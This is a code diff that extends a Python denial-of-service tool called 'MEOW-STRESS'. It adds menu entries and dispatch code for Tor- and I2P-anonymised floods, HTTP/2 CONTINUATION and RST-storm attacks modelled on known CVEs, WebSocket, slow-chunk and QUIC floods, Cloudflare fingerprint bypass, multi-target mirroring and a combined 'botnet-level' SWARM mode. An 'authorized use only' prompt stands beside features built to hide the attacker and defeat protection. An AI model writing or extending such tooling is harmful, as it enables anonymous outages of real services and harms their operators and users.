+            t = threading.Thread(target=_worker_http_mirror,
+                                 args=(mirror_http, stats, use_proxy, UA_LIST, use_cffi),
+                                 daemon=True)
+        # ── Mirror override pour ICMP (L3) ────────────────────────
+        elif mirror_mode and method == "ICMP":
+            t = threading.Thread(target=_worker_icmp_mirror,
+                                 args=(mirror_l3, stats), daemon=True)
+        # ── Mirror override pour UDP (L4) ─────────────────────────
+        elif mirror_mode and method == "UDP":
+            t = threading.Thread(target=_worker_udp_mirror,
+                                 args=(mirror_l3, l3_port, stats), daemon=True)
+        # ── Méthodes standard (pas de mirror ou méthodes spéciales) ──
+        elif method == "HTTP_GET":     t = threading.Thread(target=_worker_http_get,    args=(url, stats, use_proxy, UA_LIST), daemon=True)
         elif method == "HTTP_POST":    t = threading.Thread(target=_worker_http_post,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
         elif method == "HTTP_HEAD":    t = threading.Thread(target=_worker_http_head,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
         elif method == "HTTP_BYPASS":  t = threading.Thread(target=_worker_http_bypass, args=(url, stats, use_proxy, UA_LIST), daemon=True)
@@ -950,31 +1742,58 @@ def _run_attack(target: str, method: str, workers: int, duration: int,
         elif method == "HTTP_MIXED":   t = threading.Thread(target=_worker_http_mixed,  args=(url, stats, use_proxy, UA_LIST), daemon=True)
         elif method == "RESONANCE":    t = threading.Thread(target=_worker_resonance,   args=(url, stats, use_proxy, UA_LIST, resonance_timer), daemon=True)
         elif method == "PULSAR":       t = threading.Thread(target=_worker_pulsar,      args=(url, stats, use_proxy, UA_LIST, pulsar_barrier, pulsar_sleep, use_cffi), daemon=True)
-        elif method == "SLOWLORIS":    t = threading.Thread(target=_worker_slowloris,   args=(host, port, stats, use_proxy),  daemon=True)
-        elif method == "RUDY":         t = threading.Thread(target=_worker_rudy,        args=(host, port, parsed_path, stats, use_proxy), daemon=True)
-        elif method == "TLS":          t = threading.Thread(target=_worker_tls,         args=(host, port, stats, use_proxy),  daemon=True)
-        elif method == "TCP":          t = threading.Thread(target=_worker_tcp,         args=(host, port, stats, use_proxy),  daemon=True)
-        elif method == "UDP":          t = threading.Thread(target=_worker_udp,         args=(host, port, stats),             daemon=True)
-        elif method == "ICMP":         t = threading.Thread(target=_worker_icmp,        args=(host, stats),                   daemon=True)
-        else:                          continue
+        elif method == "SPECTER":        t = threading.Thread(target=_worker_specter,          args=(url, stats, UA_LIST, specter_renew, specter_lock, specter_counter, specter_exit_ip), daemon=True)
+        elif method == "WRAITH":         t = threading.Thread(target=_worker_wraith,           args=(url, stats, UA_LIST), daemon=True)
+        elif method == "PHANTOM_MIX":    t = threading.Thread(target=_worker_phantom_mix,      args=(url, stats, UA_LIST), daemon=True)
+        elif method == "H2_CONTINUATION":t = threading.Thread(target=_worker_h2_continuation,  args=(host, port, stats, UA_LIST), daemon=True)
+        elif method == "H2_RST":         t = threading.Thread(target=_worker_h2_rst,           args=(host, port, stats, UA_LIST), daemon=True)
+        elif method == "WS_FLOOD":       t = threading.Thread(target=_worker_ws_flood,         args=(host, port, parsed_path, use_ssl, stats), daemon=True)
+        elif method == "SLOW_CHUNK":     t = threading.Thread(target=_worker_slow_chunk,       args=(host, port, parsed_path, use_ssl, stats, UA_LIST), daemon=True)
+        elif method == "QUIC_FLOOD":     t = threading.Thread(target=_worker_quic_flood,       args=(host, 443, stats), daemon=True)
+        elif method == "SLOWLORIS":      t = threading.Thread(target=_worker_slowloris,        args=(host, port, stats, use_proxy),  daemon=True)
+        elif method == "RUDY":           t = threading.Thread(target=_worker_rudy,             args=(host, port, parsed_path, stats, use_proxy), daemon=True)
+        elif method == "TLS":            t = threading.Thread(target=_worker_tls,              args=(host, port, stats, use_proxy),  daemon=True)
+        elif method == "TCP":            t = threading.Thread(target=_worker_tcp,              args=(host, port, stats, use_proxy),  daemon=True)
+        elif method == "UDP":            t = threading.Thread(target=_worker_udp,              args=(host, port, stats),             daemon=True)
+        elif method == "ICMP":           t = threading.Thread(target=_worker_icmp,             args=(host, stats),                   daemon=True)
+        else:                            continue
         t.start()
         threads.append(t)
 
-    cffi_note = f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""
-    proxy_note = f"  proxy=[{G1}]ON (SOCKS)[/]" if use_proxy and method in SOCKET_METHODS \
-            else f"  proxy=[{G1}]ON[/]"          if use_proxy \
-            else f"  proxy=[{DM}]OFF[/]"
-    info(f"[{G1}]{len(threads)}[/] workers — method [{OR}]{method}[/]{proxy_note}{cffi_note} — {duration}s")
+    cffi_note   = f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""
+    mirror_note = f"  [{G1}]MIRROR×{len(mirror_targets_raw)}[/]" if mirror_mode else ""
+    proxy_note  = f"  proxy=[{G1}]ON (SOCKS)[/]" if use_proxy and method in SOCKET_METHODS \
+             else f"  proxy=[{G1}]ON[/]"          if use_proxy \
+             else f"  proxy=[{DM}]OFF[/]"
+    info(f"[{G1}]{len(threads)}[/] workers — method [{OR}]{method}[/]{proxy_note}{cffi_note}{mirror_note} — {duration}s")
     console.print()
 
+    display_target = (f"{len(mirror_targets_raw)} targets [MIRROR]"
+                      if mirror_mode else target)
     end_time = time.time() + duration
     try:
         with Live(console=console, refresh_per_second=4) as live:
             while time.time() < end_time and not _STOP.is_set():
                 remaining = max(0, end_time - time.time())
-                tbl = stats.render_table(target, method, True)
+                tbl = stats.render_table(display_target, method, True)
                 subtitle = None
-                if resonance_timer:
+                if specter_exit_ip is not None:
+                    circuits = specter_counter[0] // max(specter_renew, 1)
+                    subtitle = (f"[{G1}]TOR ANON[/]  "
+                                f"[{CY}]exit IP:[/] [{G1}]{specter_exit_ip[0]}[/]  "
+                                f"[{CY}]circuits:[/] [{G1}]{circuits}[/]  "
+                                f"[{CY}]origin:[/] [{RD}]HIDDEN[/]")
+                elif method == "WRAITH":
+                    subtitle = (f"[{G1}]I2P GARLIC ROUTING[/]  "
+                                f"[{CY}]outproxy:[/] [{G1}]127.0.0.1:4444[/]  "
+                                f"[{CY}]origin:[/] [{RD}]HIDDEN[/]  "
+                                f"[{DM}]tunnels auto-regénérés toutes les 10min[/]")
+                elif mirror_mode:
+                    subtitle = (f"[{G1}]MIRROR[/]  "
+                                + "  ".join(f"[{CY}]{t}[/]" for t in mirror_targets_raw[:4])
+                                + (f"  [{DM}]+{len(mirror_targets_raw)-4} more[/]"
+                                   if len(mirror_targets_raw) > 4 else ""))
+                elif resonance_timer:
                     eff = workers / max(resonance_timer.interval, 0.001)
                     subtitle = (f"[{CY}]interval=[{G1}]{resonance_timer.interval*1000:.1f}ms[/]  "
                                 f"adaptations=[{G1}]{resonance_timer.generation}[/]  "
@@ -982,9 +1801,8 @@ def _run_attack(target: str, method: str, workers: int, duration: int,
                 elif pulsar_sleep is not None:
                     waves = int(stats.elapsed / max(pulsar_sleep[0], 0.01))
                     subtitle = (f"[{CY}]wave_interval=[{G1}]{pulsar_sleep[0]*1000:.0f}ms[/]  "
-                                f"waves=[{G1}]{waves}[/]  "
-                                f"workers/wave=[{G1}]{workers}[/]"
-                                + (f"  [{G1}]CF-BYPASS ACTIVE[/]" if use_cffi else ""))
+                                f"waves=[{G1}]{waves}[/]  workers/wave=[{G1}]{workers}[/]"
+                                + (f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""))
                 if subtitle:
                     panel_content = Panel(tbl,
                         title=f"[bold {RD}]◈ MEOW-STRESS :: {method} ◈  [{OR}]{remaining:.0f}s remaining[/]",
@@ -1005,11 +1823,11 @@ def _run_attack(target: str, method: str, workers: int, duration: int,
 
     console.print()
     console.print(Panel(
-        stats.render_table(target, method, False),
+        stats.render_table(display_target, method, False),
         title=f"[bold {G1}]◈ ATTACK COMPLETE ◈",
         border_style=G2
     ))
-    _save_results(target, method, stats, workers, duration)
+    _save_results(display_target, method, stats, workers, duration)
 
 def _save_results(target, method, stats: Stats, workers, duration):
     os.makedirs("data", exist_ok=True)
@@ -1043,7 +1861,19 @@ METHODS = {
     "9":  ("HTTP_MIXED",  "L7  · Mixed methods        (random GET/POST/HEAD/BYPASS + proxy)"),
     # Méthodes UNIQUE
     "16": ("RESONANCE",  "L7  · RESONANCE            (Little's Law adaptive saturation — low BW, max load)"),
-    "17": ("PULSAR",     "L7  · PULSAR [UNIQUE]      (vagues synchronisées Barrier — sature accept() OS, bypass CF)"),
+    "17": ("PULSAR",     "L7  · PULSAR               (vagues synchronisées Barrier — sature accept() OS, bypass CF)"),
+    "18": ("SPECTER",    "L7  · SPECTER [ANON]       (flood via Tor — IP d'origine JAMAIS révélée, circuit renewal)"),
+    "19": ("WRAITH",     "L7  · WRAITH  [ANON]       (flood via I2P garlic routing — origine invisible, pas de Tor)"),
+    # HTTP/2 & WebSocket Exploits
+    "20": ("H2_CONTINUATION","L7  · H2_CONTINUATION  [★★★★★] HEADERS sans END_HEADERS → OOM serveur (CVE-2024-27316 style)"),
+    "21": ("H2_RST",         "L7  · H2_RST           [★★★★]  RST Storm → alloc/dealloc per stream (CVE-2023-44487 style)"),
+    "22": ("WS_FLOOD",       "L7  · WS_FLOOD         [★★★★]  WebSocket PING flood → PONG obligatoire RFC 6455"),
+    "23": ("SLOW_CHUNK",     "L7  · SLOW_CHUNK        [★★★]  Chunked slow body → bypass RUDY mitigations"),
+    "24": ("QUIC_FLOOD",     "L4  · QUIC_FLOOD        [★★★]  UDP/443 QUIC Initial flood → HTTP/3 targets"),
+    # Double anonymat
+    "25": ("PHANTOM_MIX",    "L7  · PHANTOM_MIX [ANON][★★★★]  Tor + I2P en alternance — double pool d'exit IPs"),
+    # Botnet-level
+    "26": ("SWARM",          "MEGA· SWARM        [★★★★★] MULTI-VECTEUR 5 méthodes simultanées — pire qu'un botnet"),
     # L7 Socket
     "10": ("SLOWLORIS",   "L7  · Slowloris            (conn exhaustion, SOCKS proxy)"),
     "11": ("RUDY",        "L7  · R-U-Dead-Yet         (slow POST body, SOCKS proxy)"),
@@ -1057,7 +1887,7 @@ METHODS = {
 
 def run():
     show_module_banner("stress")
-    cat_talk(CAT_HACKER, "Stress testing engine loaded — 17 methods.", OR)
+    cat_talk(CAT_HACKER, "Stress testing engine loaded — 26 methods.", OR)
     console.print()
 
     warn("AUTHORIZED USE ONLY — Unauthorized stress testing is illegal.")
@@ -1066,7 +1896,6 @@ def run():
     if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
         info("Aborted."); return
 
-    # Info curl_cffi
     if HAS_CFFI:
         ok(f"curl_cffi detected — Cloudflare/JA3 bypass [{G1}]AVAILABLE[/]")
     else:
@@ -1075,7 +1904,11 @@ def run():
     console.print()
 
     while True:
-        console.print(Rule(f"[{G1}] STRESS TEST — 17 METHODS ", style=G2))
+        console.print(Rule(f"[{G1}] STRESS TEST — 26 METHODS ", style=G2))
+        console.print(f"  [{RD}]── ★ BOTNET-LEVEL — Multi-Vecteur ───────────────────────────[/]")
+        for k in ("26",):
+            _, desc = METHODS[k]
+            console.print(f"  [{RD}][{k:>2}][/] {desc}")
         console.print(f"  [{DM}]── Application Layer L7 HTTP (proxy rotation) ──────────────[/]")
         for k in ("1","2","3","4","5","6","7","8","9"):
             _, desc = METHODS[k]
@@ -1084,6 +1917,14 @@ def run():
         for k in ("16","17"):
             _, desc = METHODS[k]
             console.print(f"  [{G1}][{k:>2}][/] {desc}")
+        console.print(f"  [{DM}]── ANONYMAT — IP d'origine jamais révélée ───────────────────[/]")
+        for k in ("18","19","25"):
+            _, desc = METHODS[k]
+            console.print(f"  [{G1}][{k:>2}][/] {desc}")
+        console.print(f"  [{DM}]── HTTP/2 & WebSocket Exploits ──────────────────────────────[/]")
+        for k in ("20","21","22","23","24"):
+            _, desc = METHODS[k]
+            console.print(f"  [{CY}][{k:>2}][/] {desc}")
         console.print(f"  [{DM}]── Application Layer L7 Socket (SOCKS proxy) ───────────────[/]")
         for k in ("10","11","12"):
             _, desc = METHODS[k]
@@ -1105,6 +1946,23 @@ def run():
         target = Prompt.ask(f"  [{G1}]◈ Target (IP / URL / domain)[/]").strip()
         if not target: continue
 
+        # Mirror mode — cibles supplémentaires (pas pour méthodes anon / raw / SWARM)
+        _NO_MIRROR = {"SPECTER","WRAITH","PHANTOM_MIX","SWARM",
+                      "H2_CONTINUATION","H2_RST","WS_FLOOD","SLOW_CHUNK","QUIC_FLOOD"}
+        extra_targets = []
+        mirror_eligible = method in (
+            "HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","HTTP_JSON",
+            "HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED","ICMP","UDP"
+        ) and method not in _NO_MIRROR
+        if mirror_eligible:
+            extra_raw = Prompt.ask(
+                f"  [{CY}]◈ Mirror targets (autres cibles, séparées par virgule — vide = désactivé)[/]",
+                default=""
+            ).strip()
+            if extra_raw:
+                extra_targets = [t.strip() for t in extra_raw.split(",") if t.strip()]
+                ok(f"Mirror mode: [{G1}]{1 + len(extra_targets)}[/] cibles totales")
+
         default_workers = 50 if method in ("HTTP_GET","HTTP_POST","HTTP_JSON","TCP","PULSAR") else 20
         try:
             workers = IntPrompt.ask(f"  [{G1}]◈ Workers[/]", default=default_workers)
@@ -1122,21 +1980,32 @@ def run():
         use_proxy  = False
         use_cffi   = False
 
-        if method not in ("UDP", "ICMP"):
+        # Méthodes avec anonymat ou raw TLS — pas de proxy externe
+        _ANON_METHODS = {"SPECTER","WRAITH","PHANTOM_MIX",
+                         "H2_CONTINUATION","H2_RST","WS_FLOOD","SLOW_CHUNK","QUIC_FLOOD"}
+        if method == "SWARM":
+            use_proxy = Confirm.ask(f"  [{OR}]◈ SWARM — Use proxy rotation? (HTTP/SOCKS)[/]", default=False)
+        elif method in _ANON_METHODS:
+            if method in ("SPECTER","WRAITH","PHANTOM_MIX"):
+                info(f"[{G1}]{method}[/] — proxy externe désactivé (anonymat géré par Tor/I2P)")
+            else:
+                info(f"[{G1}]{method}[/] — connexion TLS directe (pas de proxy support pour cette méthode)")
+        elif method not in ("UDP", "ICMP") and method not in _ANON_METHODS:
             if method in ("TCP","SLOWLORIS","RUDY","TLS"):
                 proxy_label = f"[{OR}]◈ Use proxy rotation? (SOCKS — requires PySocks)[/]"
             else:
                 proxy_label = f"[{OR}]◈ Use proxy rotation? (HTTP/SOCKS)[/]"
             use_proxy = Confirm.ask(f"  {proxy_label}", default=False)
 
-        # Option curl_cffi (bypass Cloudflare / JA3) pour les méthodes HTTP
-        if method in ("HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","HTTP_JSON",
-                      "HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
-                      "RESONANCE","PULSAR"):
+        # Option curl_cffi (bypass Cloudflare / JA3) pour les méthodes HTTP standard
+        _CFFI_ELIGIBLE = {"HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","HTTP_JSON",
+                          "HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
+                          "RESONANCE","PULSAR","SWARM"}
+        if method in _CFFI_ELIGIBLE:
             if HAS_CFFI:
                 use_cffi = Confirm.ask(
                     f"  [{G1}]◈ Bypass Cloudflare/JA3? (curl_cffi Chrome fingerprint)[/]",
-                    default=(method == "PULSAR")
+                    default=(method in ("PULSAR","SWARM"))
                 )
             else:
                 info(f"[{DM}]curl_cffi not installed — no CF bypass. pip install curl_cffi[/]")
@@ -1145,7 +2014,29 @@ def run():
             info("RESONANCE — recommended: 10-30 workers")
         if method == "PULSAR":
             info(f"PULSAR — recommended: [{G1}]50-100 workers[/], bursts synchronisés")
-            info(f"stream=True → body abandonné — serveur bufferise tout pour rien")
+        if method == "SPECTER":
+            info(f"SPECTER — recommended: [{G1}]5-15 workers[/] (Tor est lent, 1-5s/req)")
+            info(f"stem requis pour circuit renewal: [{CY}]pip install stem[/]")
+        if method == "WRAITH":
+            info(f"WRAITH — recommended: [{G1}]5-20 workers[/] (I2P est plus stable que Tor)")
+            info(f"Attendre 1-2 min que les tunnels I2P soient construits si I2P vient de démarrer")
+        if method == "PHANTOM_MIX":
+            info(f"PHANTOM_MIX — recommended: [{G1}]10-30 workers[/] (Tor+I2P — lent mais double anonymat)")
+        if method == "H2_CONTINUATION":
+            info(f"H2_CONTINUATION — requires HTTPS target. [{G1}]20-50 workers[/] recommended")
+            info(f"[{RD}]Très efficace contre serveurs non-patchés[/] — Apache httpd, nginx <1.25.3")
+        if method == "H2_RST":
+            info(f"H2_RST — requires HTTPS target. [{G1}]30-80 workers[/] recommended")
+        if method == "WS_FLOOD":
+            info(f"WS_FLOOD — target must support WebSocket. [{G1}]20-50 workers[/]")
+        if method == "SLOW_CHUNK":
+            info(f"SLOW_CHUNK — recommended: [{G1}]10-30 workers[/] (chaque worker garde une connexion ouverte)")
+        if method == "QUIC_FLOOD":
+            info(f"QUIC_FLOOD — UDP/443. [{G1}]1-5 workers[/] suffisent (pas de throttle)")
+            info(f"Target must support HTTP/3 (Cloudflare, Caddy, nginx ≥1.25)")
+        if method == "SWARM":
+            info(f"SWARM — [{RD}]MODE BOTNET SIMULÉ[/] — [{G1}]100-200 workers[/] pour effet maximal")
+            info(f"5 méthodes simultanées : BYPASS + PULSAR + COOKIE + SLOWLORIS + TLS")
 
         console.print()
         info(f"Target: [{CY}]{target}[/]  Method: [{OR}]{method}[/]  "
@@ -1153,5 +2044,9 @@ def run():
              + (f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""))
         console.print()
 
-        _run_attack(target, method, workers, duration, use_proxy, use_cffi)
+        if method == "SWARM":
+            _run_swarm(target, workers, duration, use_proxy, use_cffi)
+        else:
+            _run_attack(target, method, workers, duration, use_proxy, use_cffi,
+                        extra_targets=extra_targets if extra_targets else None)
         console.print()
